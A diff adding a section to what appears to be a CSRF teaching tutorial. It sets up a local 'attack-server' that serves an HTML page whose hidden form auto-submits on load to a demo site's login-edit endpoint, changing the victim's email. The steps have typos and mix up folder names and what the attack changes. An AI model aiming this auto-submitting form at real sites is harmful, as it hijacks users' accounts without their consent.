@@ -583,3 +583,75 @@ We are going to use
           router.get('/login/edit', loginEditForm);
           router.post('/login/edit', processLoginEditForm);
         ```
+- Attack-server
+  
+  - Initial steps
+
+    - Create a folder named "target-server"
+
+      ```bash
+        cd apps && mkdir attack-server && cd attack-server
+      ```
+
+    - Add package.json file
+
+      ```bash
+        cd apps/attack-server && pnpm init
+      ```
+
+    - Add .gitignore file
+
+      ```bash
+        # cd apps/attack-server
+        touch .gitignore
+        node --eval "fs.writeFileSync('.gitignore', 'node_modules\n')"
+      ```
+
+    - Add dev dependencies
+
+      ```bash
+        # cd apps/targeattackt-server 
+        pnpm i serve
+      ```
+    - Add package.json scrpts
+
+      ```bash
+        # cd apps/target-server 
+        npm pkg set scripts.dev="serve -l 5555 ./src/index.html"
+      ```
+
+  
+  - First attack form
+
+    - Create an apps/attack-server/src/index.html file
+
+      ```html
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+          <meta charset="UTF-8">
+          <meta name="viewport" content="width=device-width, initial-scale=1.0">
+          <title>Attacker WebSite</title>
+        </head>
+        <body>
+          <div>
+            <h1>Some nice website</h1>
+            <form name="form" action='http://localhost:3333/login/edit' method='post'>
+              <input type='hidden' name='email' value='HACKED@test.com' />
+            </form>
+          </div>
+          <script>
+            document.form.submit()
+          </script>
+        </body>
+        </html>
+      ```
+
+    - How this attack occurs
+      - targer-server
+        - Run targer-server: [targer-server](http://localhost:3333/home)
+        - Login into targer-server
+      - attack-server
+        - Run targer-server: [attack-server](http://localhost:5555)
+        - This is going to automaticaly call form post and change your password.
+
